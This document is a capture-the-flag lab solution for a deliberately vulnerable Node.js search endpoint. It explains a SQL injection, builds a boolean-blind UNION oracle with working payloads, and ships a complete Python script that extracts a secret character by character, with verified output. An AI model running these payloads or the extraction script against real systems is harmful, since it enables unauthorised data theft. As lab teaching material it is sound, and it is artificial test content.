# w05 Data Jack :: solution

## Root cause

`app.js`, `/search`:

```js
const q = typeof req.query.q === 'string' ? req.query.q : '';

const row = db.prepare(`SELECT id FROM records WHERE tag = '${q}'`).get();
found = row !== undefined;
```

User input is interpolated straight into SQL. No parameterisation — same class
of bug as w01, but here the handler leaks **one bit** instead of rows:
`found` is `true` when the query returns any row, `false` otherwise. Errors are
swallowed into the same `{"found":false}` shape, so no error text, row data or
column count is ever observable.

## The oracle

`better-sqlite3` compiles a **single** statement with `.prepare()` and rejects
anything else, so stacked queries (`'; SELECT ...`) are out. A `UNION SELECT`
is one statement, so it works.

The injection point closes the string literal, and lookup is an **exact match**
on `tag`, so an unmatched value yields no row and the response is `false`.
Appending a `UNION SELECT` arm that returns a row only when a condition holds
turns the endpoint into a boolean oracle:

```
' UNION SELECT 1 WHERE (<condition>) /*
```

SQL becomes:

```sql
SELECT id FROM records WHERE tag = '' UNION SELECT 1 WHERE (<condition>) /*
```

- The base `tag = ''` arm matches nothing, so the result is entirely
  determined by the injected arm.
- `UNION` de-duplicates, so the `1` arm adds a row only when `<condition>` is
  true.
- So `{"found":true}` ⟺ `<condition>` is true. One yes/no question per request.

### Comment gotcha: use `/*`, not `--`

This bit me while building the lab and is worth knowing. The whole query is
assembled on **one line**:

```sql
SELECT id FROM records WHERE tag = '' UNION SELECT 1 WHERE (1=2) -- '
```

SQLite only begins a `--` comment at a token boundary. Here the `--` is
swallowed as two unary minus operators and the trailing `'` is parsed as an
**alias**, so the statement stays valid and the condition stops gating —
`1=2` still returned `found:true`. `/*` truncates the tail unconditionally:

```sql
SELECT id FROM records WHERE tag = '' UNION SELECT 1 WHERE (1=2) /*
```

Confirmed behaviour:

```bash
q=' UNION SELECT 1 WHERE 1=1 /*    -> {"found":true}
q=' UNION SELECT 1 WHERE 1=2 /*    -> {"found":false}
q=' UNION SELECT 1 WHERE (SELECT substr(secret,1,1) FROM vault)='h' /*  -> {"found":true}
q=' UNION SELECT 1 WHERE (SELECT substr(secret,1,1) FROM vault)='x' /*  -> {"found":false}
```

### Other shapes that do NOT work

- `UNION SELECT count(*) WHERE ...` — `count(*)` is an aggregate; without
  `GROUP BY` it always returns exactly one row, so the duplicate is absorbed by
  `UNION` and the answer is unconditionally `true`. Always `UNION SELECT 1`.
- Wrapping the base search in `LIKE '%q%'` — the `'%'` wildcard matches every
  seeded row, so the base arm always returns a row and the injected arm never
  changes the outcome. The exact-match `tag = '<q>'` predicate is what makes
  the oracle clean.
- Time-based (`randomblob(1e8)` in a `WHERE`) works too, but the boolean oracle
  is faster and needs no timing tolerance. Not needed here.

## Extraction

One character at a time, wrapping around when `substr` runs off the end of the
string. ~7 requests per character with a binary search over the character set.

The end-of-string probe is worth noting: `substr(secret,n,1)` past the end
returns `''`, whose `length()` is 0. Probing
`(SELECT length(substr(secret,n,1)) FROM vault)=1` is the reliable terminator —
do **not** use `count(DISTINCT substr(secret,n,1))`, which is 1 for the empty
string and never terminates.

```python
#!/usr/bin/env python3
"""
Boolean-blind UNION extraction for w05 data-jack.

    python3 blind_extract.py               # http://localhost:30005
    python3 blind_extract.py http://host:port
"""
import json
import string
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:30005"
CHARS = sorted(
    set(
        string.ascii_lowercase
        + string.digits
        + "_{}!@#$%^&*()-+=[]:;,.?/"
        + string.ascii_uppercase
    )
)
MAXLEN = 128


def ask(condition: str) -> bool:
    """One yes/no question. `condition` must be a complete scalar expression."""
    payload = f"' UNION SELECT 1 WHERE ({condition}) /*"
    url = BASE + "/search?" + urllib.parse.urlencode({"q": payload})
    with urllib.request.urlopen(url, timeout=10) as r:
        return bool(json.loads(r.read())["found"])


def char_at(n: int) -> str:
    """Binary-search the n-th character of vault.secret. '' means past the end."""
    if not ask(f"(SELECT length(substr(secret,{n},1)) FROM vault)=1"):
        return ""

    lo, hi = 0, len(CHARS) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (
            f"(SELECT substr(secret,{n},1) FROM vault) "
            f"BETWEEN '{CHARS[lo]}' AND '{CHARS[mid]}'"
        )
        if ask(cond):
            hi = mid
        else:
            lo = mid + 1

    c = CHARS[lo]
    if not ask(f"(SELECT substr(secret,{n},1) FROM vault)='{c}'"):
        raise SystemExit(f"[!] position {n}: character outside candidate set")
    return c


def main() -> None:
    print(f"[*] target: {BASE}")
    assert ask("1=1"), "oracle is dead: true condition returned false"
    assert not ask("1=2"), "oracle is dead: false condition returned true"
    print("[+] oracle confirmed (1=1 -> true, 1=2 -> false)")

    flag = ""
    while len(flag) < MAXLEN:
        c = char_at(len(flag) + 1)
        if c == "":
            break
        flag += c
        print(f"[+] {flag}")

    print(f"\nFLAG: {flag}")


if __name__ == "__main__":
    main()
```

The same script ships next to this writeup as `blind_extract.py`. Run it:

```bash
python3 blind_extract.py http://localhost:30005
```

Verified output against a container started with
`W0B_FLAG='hex4b0t{verifytest123456}'`:

```
[*] target: http://localhost:30005
[+] oracle confirmed (1=1 -> true, 1=2 -> false)
[+] hex4b0t{verifytest123456}

FLAG: hex4b0t{verifytest123456}
```


## Flag

Injected at runtime via `W0B_FLAG`, seeded into `vault.secret` at boot. There is
no static value to hardcode.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
